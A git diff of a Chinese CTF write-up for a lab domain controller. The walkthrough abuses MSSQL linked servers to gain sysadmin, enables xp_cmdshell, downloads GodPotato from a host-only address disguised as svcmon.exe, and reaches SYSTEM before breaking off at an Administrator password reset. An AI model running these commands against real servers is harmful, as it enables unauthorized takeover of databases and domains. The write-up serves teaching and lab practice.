+### 2.5 初始开放端口结论
+工具：端口探测
 
-<font style="color:rgb(51, 51, 51);">目的：建立完整攻击面。</font>
+目的：建立完整攻击面。
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">53/tcp</font>`<font style="color:rgb(51, 51, 51);"> DNS</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">80/tcp</font>`<font style="color:rgb(51, 51, 51);"> IIS 10.0</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">88/tcp</font>`<font style="color:rgb(51, 51, 51);"> Kerberos</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">135/tcp</font>`<font style="color:rgb(51, 51, 51);"> RPC</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">139/tcp</font>`<font style="color:rgb(51, 51, 51);"> NetBIOS</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">389/tcp</font>`<font style="color:rgb(51, 51, 51);"> LDAP</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">445/tcp</font>`<font style="color:rgb(51, 51, 51);"> SMB</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">464/tcp</font>`<font style="color:rgb(51, 51, 51);"> Kerberos kpasswd</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">593/tcp</font>`<font style="color:rgb(51, 51, 51);"> RPC over HTTP</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">636/tcp</font>`<font style="color:rgb(51, 51, 51);"> LDAPS</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">1433/tcp</font>`<font style="color:rgb(51, 51, 51);"> MSSQL</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">9389/tcp</font>`<font style="color:rgb(51, 51, 51);"> AD Web Services</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">49666/tcp</font>``<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">49667/tcp</font>``<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">49669/tcp</font>``<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">49670/tcp</font>`<font style="color:rgb(51, 51, 51);"> 高位 RPC</font>
++ `53/tcp` DNS
++ `80/tcp` IIS 10.0
++ `88/tcp` Kerberos
++ `135/tcp` RPC
++ `139/tcp` NetBIOS
++ `389/tcp` LDAP
++ `445/tcp` SMB
++ `464/tcp` Kerberos kpasswd
++ `593/tcp` RPC over HTTP
++ `636/tcp` LDAPS
++ `1433/tcp` MSSQL
++ `9389/tcp` AD Web Services
++ `49666/tcp``49667/tcp``49669/tcp``49670/tcp` 高位 RPC
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">这是一台“域控 + IIS + MSSQL”混合角色机器。</font>
-+ <font style="color:rgb(51, 51, 51);">真正可打的重心是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">1433/tcp</font>`<font style="color:rgb(51, 51, 51);">，而不是薄弱的静态 Web 页面。</font>
++ 这是一台“域控 + IIS + MSSQL”混合角色机器。
++ 真正可打的重心是 `1433/tcp`，而不是薄弱的静态 Web 页面。
 
-## <font style="color:rgb(51, 51, 51);">3. 离线取证与关键线索</font>
-<font style="color:rgb(51, 51, 51);">工具：VirtualBox 磁盘克隆、Python + </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">dissect.target</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">LnkParse3</font>`
+## 3. 离线取证与关键线索
+工具：VirtualBox 磁盘克隆、Python + `dissect.target`、`LnkParse3`
 
-<font style="color:rgb(51, 51, 51);">目的：Web 正面几乎没有入口时，直接离线分析系统盘，找明文凭据、服务配置、Recent 痕迹和管理员操作记录。</font>
+目的：Web 正面几乎没有入口时，直接离线分析系统盘，找明文凭据、服务配置、Recent 痕迹和管理员操作记录。
 
-<font style="color:rgb(51, 51, 51);">关键思路：</font>
+关键思路：
 
-1. <font style="color:rgb(51, 51, 51);">先对靶机系统盘做克隆，得到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">bloodstained_clone.vhd</font>`<font style="color:rgb(51, 51, 51);">。</font>
-2. <font style="color:rgb(51, 51, 51);">用 Python + </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">dissect.target</font>`<font style="color:rgb(51, 51, 51);"> 打开克隆盘，重点查看：</font>
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C:\inetpub\wwwroot</font>`
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C:\Program Files\Microsoft SQL Server\...\ERRORLOG</font>`
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C:\Scripts</font>`
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent</font>`
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">ConsoleHost_history.txt</font>`
-3. <font style="color:rgb(51, 51, 51);">用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">LnkParse3</font>`<font style="color:rgb(51, 51, 51);"> 解析 Recent 目录下的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">.lnk</font>`<font style="color:rgb(51, 51, 51);">，恢复已删除文件曾经存在的路径。</font>
+1. 先对靶机系统盘做克隆，得到 `bloodstained_clone.vhd`。
+2. 用 Python + `dissect.target` 打开克隆盘，重点查看：
+    - `C:\inetpub\wwwroot`
+    - `C:\Program Files\Microsoft SQL Server\...\ERRORLOG`
+    - `C:\Scripts`
+    - `C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent`
+    - `ConsoleHost_history.txt`
+3. 用 `LnkParse3` 解析 Recent 目录下的 `.lnk`，恢复已删除文件曾经存在的路径。
 
-<font style="color:rgb(51, 51, 51);">关键发现 1：Web 根目录连接串泄露</font>
+关键发现 1：Web 根目录连接串泄露
 
-+ <font style="color:rgb(51, 51, 51);">文件：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C:\inetpub\wwwroot\poo_connection.txt</font>`
-+ <font style="color:rgb(51, 51, 51);">内容关键信息：</font>
++ 文件：`C:\inetpub\wwwroot\poo_connection.txt`
++ 内容关键信息：
 
 ```plain
 server=localhost;
@@ -4083,206 +4084,206 @@ password=lovlyBaby
 database=master
 ```
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">直接拿到 MSSQL 明文凭据 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor / lovlyBaby</font>`<font style="color:rgb(51, 51, 51);">。</font>
-+ <font style="color:rgb(51, 51, 51);">这是整条链路的真正起点。</font>
++ 直接拿到 MSSQL 明文凭据 `wuwupor / lovlyBaby`。
++ 这是整条链路的真正起点。
 
-<font style="color:rgb(51, 51, 51);">关键发现 2：SQL 服务账号</font>
+关键发现 2：SQL 服务账号
 
-+ <font style="color:rgb(51, 51, 51);">从 SQL ERRORLOG 可确认 SQL Server 服务账号为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\sqlsvc</font>`<font style="color:rgb(51, 51, 51);">。</font>
++ 从 SQL ERRORLOG 可确认 SQL Server 服务账号为 `XMCVE\sqlsvc`。
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">说明之后 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 很可能会以 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 身份执行系统命令。</font>
++ 说明之后 `xp_cmdshell` 很可能会以 `sqlsvc` 身份执行系统命令。
 
-<font style="color:rgb(51, 51, 51);">关键发现 3：linked server</font>
+关键发现 3：linked server
 
-+ <font style="color:rgb(51, 51, 51);">SQL 内存在两个 linked server：</font>
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_CONFIG</font>`
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`
++ SQL 内存在两个 linked server：
+    - `POO_CONFIG`
+    - `POO_PUBLIC`
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">这类配置在 CTF 里通常不是装饰，很可能就是从低权限 SQL 登录横向到高权限上下文的关键。</font>
++ 这类配置在 CTF 里通常不是装饰，很可能就是从低权限 SQL 登录横向到高权限上下文的关键。
 
-<font style="color:rgb(51, 51, 51);">关键发现 4：辅助痕迹</font>
+关键发现 4：辅助痕迹
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">MailBot.ps1</font>`<font style="color:rgb(51, 51, 51);"> 里出现过一组像比赛用户名/密码的字符串：</font>
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">pr3d1ct / yuyan_crypto</font>`
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">p2zhh / p2zhh_web</font>`
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">aomr / aomr_reverse</font>`
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">berial / berial_pwn</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Recent</font>`<font style="color:rgb(51, 51, 51);"> 和 PowerShell history 指向过一批已删除文件：</font>
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">dcsync.sh</font>`
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">golden_ticket.sh</font>`
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SAM.save</font>`
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SECURITY.save</font>`
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM.save</font>`
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">fix_linked_server.ps1</font>`
++ `MailBot.ps1` 里出现过一组像比赛用户名/密码的字符串：
+    - `pr3d1ct / yuyan_crypto`
+    - `p2zhh / p2zhh_web`
+    - `aomr / aomr_reverse`
+    - `berial / berial_pwn`
++ `Recent` 和 PowerShell history 指向过一批已删除文件：
+    - `dcsync.sh`
+    - `golden_ticket.sh`
+    - `SAM.save`
+    - `SECURITY.save`
+    - `SYSTEM.save`
+    - `fix_linked_server.ps1`
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">这些痕迹说明题目设计方向就是“SQL/AD abuse -> 高权限控制”。</font>
-+ <font style="color:rgb(51, 51, 51);">但它们只是辅助线索，不是最终利用点。</font>
++ 这些痕迹说明题目设计方向就是“SQL/AD abuse -> 高权限控制”。
++ 但它们只是辅助线索，不是最终利用点。
 
-## <font style="color:rgb(51, 51, 51);">4. MSSQL 利用链</font>
-<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">invoke_sql_query.ps1</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">invoke_xpcmd.ps1</font>`
+## 4. MSSQL 利用链
+工具：`invoke_sql_query.ps1`、`invoke_xpcmd.ps1`
 
-<font style="color:rgb(51, 51, 51);">目的：用已知 SQL 凭据登录数据库，判断权限边界，利用 linked server 完成 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sysadmin</font>`<font style="color:rgb(51, 51, 51);"> 提权，并开启 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);">。</font>
+目的：用已知 SQL 凭据登录数据库，判断权限边界，利用 linked server 完成 `sysadmin` 提权，并开启 `xp_cmdshell`。
 
-### <font style="color:rgb(51, 51, 51);">4.1 连接 MSSQL 并确认初始权限</font>
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+### 4.1 连接 MSSQL 并确认初始权限
+关键命令：
 
 & .\invoke_sql_query.ps1 -Query "select @@servername as server_name, SYSTEM_USER as login_name, USER_NAME() as db_user, IS_SRVROLEMEMBER('sysadmin') as is_sysadmin"
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
-+ <font style="color:rgb(51, 51, 51);">当前 SQL 登录为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor</font>`
-+ <font style="color:rgb(51, 51, 51);">当前数据库用户最初只是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">guest</font>`
-+ <font style="color:rgb(51, 51, 51);">初始并不是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sysadmin</font>`
++ 当前 SQL 登录为 `wuwupor`
++ 当前数据库用户最初只是 `guest`
++ 初始并不是 `sysadmin`
 
-<font style="color:rgb(51, 51, 51);">说明：</font>
+说明：
 
-+ <font style="color:rgb(51, 51, 51);">这意味着明文连接串本身还不够，需要继续从 SQL 配置里提权。</font>
++ 这意味着明文连接串本身还不够，需要继续从 SQL 配置里提权。
 
-### <font style="color:rgb(51, 51, 51);">4.2 枚举 linked server</font>
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+### 4.2 枚举 linked server
+关键命令：
 
 & .\invoke_sql_query.ps1 -Query "select server_id, name, data_source, is_linked, is_rpc_out_enabled, is_data_access_enabled from sys.servers order by server_id"
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_CONFIG -> localhost</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC -> localhost</font>`
-+ <font style="color:rgb(51, 51, 51);">两者都开启了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">RPC OUT</font>`<font style="color:rgb(51, 51, 51);">，并允许数据访问</font>
++ `POO_CONFIG -> localhost`
++ `POO_PUBLIC -> localhost`
++ 两者都开启了 `RPC OUT`，并允许数据访问
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">这两个 linked server 可以直接作为横向执行入口测试。</font>
++ 这两个 linked server 可以直接作为横向执行入口测试。
 
-### <font style="color:rgb(51, 51, 51);">4.3 验证 linked server 执行身份</font>
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+### 4.3 验证 linked server 执行身份
+关键命令：
 
 & .\invoke_sql_query.ps1 -Query "EXEC ('select @@servername as server_name, SYSTEM_USER as login_name, USER_NAME() as db_user') AT [POO_PUBLIC]" -ConnectionTimeout 20
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
 ```plain
 server_name  login_name  db_user
 CASTLEVANIA  sa          dbo
 ```
 
-<font style="color:rgb(51, 51, 51);">补充观察：</font>
+补充观察：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_CONFIG</font>`<font style="color:rgb(51, 51, 51);"> 执行时只是普通低权限上下文。</font>
-+ <font style="color:rgb(51, 51, 51);">真正有价值的是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);">，它把当前请求映射到了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sa / dbo</font>`<font style="color:rgb(51, 51, 51);">。</font>
++ `POO_CONFIG` 执行时只是普通低权限上下文。
++ 真正有价值的是 `POO_PUBLIC`，它把当前请求映射到了 `sa / dbo`。
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">这里已经找到了从普通 SQL 登录跳到高权限 SQL 上下文的关键跳板。</font>
++ 这里已经找到了从普通 SQL 登录跳到高权限 SQL 上下文的关键跳板。
 
-### <font style="color:rgb(51, 51, 51);">4.4 把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor</font>`<font style="color:rgb(51, 51, 51);"> 提成 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sysadmin</font>`
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+### 4.4 把 `wuwupor` 提成 `sysadmin`
+关键命令：
 
 & .\invoke_sql_query.ps1 -Query "EXEC ('EXEC master..sp_addsrvrolemember ''wuwupor'', ''sysadmin''') AT [POO_PUBLIC]" -ConnectionTimeout 20
 
-<font style="color:rgb(51, 51, 51);">随后复查：</font>
+随后复查：
 
 & .\invoke_sql_query.ps1 -Query "select SYSTEM_USER as login_name, USER_NAME() as db_user, IS_SRVROLEMEMBER('sysadmin') as is_sysadmin" -ConnectionTimeout 20
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor</font>`<font style="color:rgb(51, 51, 51);"> 变为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">dbo</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">IS_SRVROLEMEMBER('sysadmin') = 1</font>`
++ `wuwupor` 变为 `dbo`
++ `IS_SRVROLEMEMBER('sysadmin') = 1`
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">至此，SQL 低权限登录被稳定提到了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sysadmin</font>`<font style="color:rgb(51, 51, 51);">。</font>
++ 至此，SQL 低权限登录被稳定提到了 `sysadmin`。
 
-### <font style="color:rgb(51, 51, 51);">4.5 开启 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 并验证系统命令上下文</font>
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+### 4.5 开启 `xp_cmdshell` 并验证系统命令上下文
+关键命令：
 
 ```plain
 & .\invoke_sql_query.ps1 -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;" -ConnectionTimeout 20
 & .\invoke_xpcmd.ps1 -Command 'whoami' -ConnectionTimeout 20
 ```
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
 xmcve\sqlsvc
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">SQL Server 系统命令是以 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 身份执行。</font>
-+ <font style="color:rgb(51, 51, 51);">这和离线取证得到的 SQL 服务账号完全对上。</font>
++ SQL Server 系统命令是以 `XMCVE\sqlsvc` 身份执行。
++ 这和离线取证得到的 SQL 服务账号完全对上。
 
-## <font style="color:rgb(51, 51, 51);">5. 从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`
-<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">serve_blob_tcp.ps1</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">invoke_xpcmd.ps1</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">stage_godpotato.ps1</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">invoke_godpotato_system.ps1</font>`
+## 5. 从 `sqlsvc` 到 `SYSTEM`
+工具：`serve_blob_tcp.ps1`、`invoke_xpcmd.ps1`、`stage_godpotato.ps1`、`invoke_godpotato_system.ps1`
 
-<font style="color:rgb(51, 51, 51);">目的：从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 进一步提到本机 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);">。</font>
+目的：从 `sqlsvc` 进一步提到本机 `SYSTEM`。
 
-<font style="color:rgb(51, 51, 51);">为什么选 GodPotato：</font>
+为什么选 GodPotato：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">whoami /priv</font>`<font style="color:rgb(51, 51, 51);"> 显示 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 拥有 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SeImpersonatePrivilege</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Spooler</font>`<font style="color:rgb(51, 51, 51);"> 服务未运行，所以没有优先走 PrintSpoofer</font>
-+ <font style="color:rgb(51, 51, 51);">这类环境更适合直接走 GodPotato</font>
++ `whoami /priv` 显示 `sqlsvc` 拥有 `SeImpersonatePrivilege`
++ `Spooler` 服务未运行，所以没有优先走 PrintSpoofer
++ 这类环境更适合直接走 GodPotato
 
-### <font style="color:rgb(51, 51, 51);">5.1 为什么最终没有采用“源码远程编译”</font>
-<font style="color:rgb(51, 51, 51);">尝试过的辅助脚本：</font>
+### 5.1 为什么最终没有采用“源码远程编译”
+尝试过的辅助脚本：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">stage_godpotato.ps1</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">invoke_godpotato_system.ps1</font>`
++ `stage_godpotato.ps1`
++ `invoke_godpotato_system.ps1`
 
-<font style="color:rgb(51, 51, 51);">尝试思路：</font>
+尝试思路：
 
-+ <font style="color:rgb(51, 51, 51);">把 GodPotato 源码下发到靶机 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">%TEMP%\gp</font>`
-+ <font style="color:rgb(51, 51, 51);">用靶机自带 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">csc.exe</font>`<font style="color:rgb(51, 51, 51);"> 编译</font>
++ 把 GodPotato 源码下发到靶机 `%TEMP%\gp`
++ 用靶机自带 `csc.exe` 编译
 
-<font style="color:rgb(51, 51, 51);">结果：</font>
+结果：
 
-+ <font style="color:rgb(51, 51, 51);">靶机编译器较老，编译 GodPotato 源码时报错，例如：</font>
++ 靶机编译器较老，编译 GodPotato 源码时报错，例如：
 
 error CS1056: Unexpected character '$'
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">“源码下发 + 靶机本地编译”不是最终稳定方案。</font>
-+ <font style="color:rgb(51, 51, 51);">真正稳定的方案是直接下发编译好的二进制。</font>
++ “源码下发 + 靶机本地编译”不是最终稳定方案。
++ 真正稳定的方案是直接下发编译好的二进制。
 
-### <font style="color:rgb(51, 51, 51);">5.2 用内存 HTTP 服务给靶机下发 GodPotato</font>
-<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">serve_blob_tcp.ps1</font>`
+### 5.2 用内存 HTTP 服务给靶机下发 GodPotato
+工具：`serve_blob_tcp.ps1`
 
-<font style="color:rgb(51, 51, 51);">目的：让宿主机只在内存里代理 GodPotato 二进制，避免文件直接落盘在本机被清理。</font>
+目的：让宿主机只在内存里代理 GodPotato 二进制，避免文件直接落盘在本机被清理。
 
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+关键命令：
 
 powershell -ExecutionPolicy Bypass -File .\serve_blob_tcp.ps1 -Bind 192.168.56.1 -Port 8001
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
-+ <font style="color:rgb(51, 51, 51);">宿主机在 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">http://192.168.56.1:8001/gp.exe</font>`<font style="color:rgb(51, 51, 51);"> 提供 GodPotato 二进制</font>
-+ <font style="color:rgb(51, 51, 51);">靶机可以通过 Host-Only 网络直接下载</font>
++ 宿主机在 `http://192.168.56.1:8001/gp.exe` 提供 GodPotato 二进制
++ 靶机可以通过 Host-Only 网络直接下载
 
-### <font style="color:rgb(51, 51, 51);">5.3 通过 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 下载二进制到靶机</font>
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+### 5.3 通过 `xp_cmdshell` 下载二进制到靶机
+关键命令：
 
 & .\invoke_xpcmd.ps1 -Command 'powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing http://192.168.56.1:8001/gp.exe -OutFile $env:TEMP\svcmon.exe; Get-Item $env:TEMP\svcmon.exe | Select-Object Name,Length | Format-Table -AutoSize"' -ConnectionTimeout 20
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">%TEMP%\svcmon.exe</font>`<font style="color:rgb(51, 51, 51);"> 成功落到靶机</font>
-+ <font style="color:rgb(51, 51, 51);">文件长度为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">57344</font>`<font style="color:rgb(51, 51, 51);"> 字节</font>
++ `%TEMP%\svcmon.exe` 成功落到靶机
++ 文件长度为 `57344` 字节
 
-### <font style="color:rgb(51, 51, 51);">5.4 触发 GodPotato 提权并验证 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+### 5.4 触发 GodPotato 提权并验证 `SYSTEM`
+关键命令：
 
 ```plain
 & .\invoke_xpcmd.ps1 -Command '%TEMP%\svcmon.exe -cmd "cmd /c whoami /all > C:\Users\sqlsvc\AppData\Local\Temp\gpwho.txt"' -ConnectionTimeout 20
 & .\invoke_xpcmd.ps1 -Command 'cmd /c type C:\Users\sqlsvc\AppData\Local\Temp\gpwho.txt' -ConnectionTimeout 20
 ```
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
 ```plain
 User Name           SID
@@ -4290,42 +4291,42 @@ User Name           SID
 nt authority\system S-1-5-18
 ```
 
-<font style="color:rgb(51, 51, 51);">同时 GodPotato 过程日志里还能看到：</font>
+同时 GodPotato 过程日志里还能看到：
 
 ```plain
 [*] CurrentUser: NT AUTHORITY\SYSTEM
 [*] process start with pid 3896
 ```
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 已经被稳定提升为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);">。</font>
++ `sqlsvc` 已经被稳定提升为 `SYSTEM`。
 
-## <font style="color:rgb(51, 51, 51);">6. 从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`
-<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">invoke_xpcmd.ps1</font>`<font style="color:rgb(51, 51, 51);">、PowerShell WMI</font>
+## 6. 从 `SYSTEM` 到 `Administrator`
+工具：`invoke_xpcmd.ps1`、PowerShell WMI
 
-<font style="color:rgb(51, 51, 51);">目的：利用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 权限直接控制域内 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);">。</font>
+目的：利用 `SYSTEM` 权限直接控制域内 `Administrator`。
 
-### <font style="color:rgb(51, 51, 51);">6.1 用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 重置域内 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 密码</font>
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+### 6.1 用 `SYSTEM` 重置域内 `Administrator` 密码
+关键命令：
 
 ```plain
